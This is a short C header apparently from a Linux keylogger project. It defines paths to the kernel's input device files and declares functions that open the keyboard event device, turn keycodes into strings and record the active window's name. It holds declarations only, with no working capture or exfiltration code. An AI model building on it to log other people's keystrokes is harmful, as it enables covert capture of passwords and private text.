#ifndef Keylogger_Utils_Keyboard_H_SENTRY
#define Keylogger_Utils_Keyboard_H_SENTRY

#define PROC_INPUT_DEVICES "/proc/bus/input/devices"
#define EVENT_PATH "/dev/input/"

#include <xkbcommon/xkbcommon.h>
#include <xkbcommon/xkbcommon-x11.h>
#include <X11/Xlib.h>
#include <X11/Xlib-xcb.h>

int get_active_window(Display *display, char **window);
const char* get_key_name(xkb_keysym_t keysym);
int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len);
int open_file_event_keyboard(int *fd);

#endif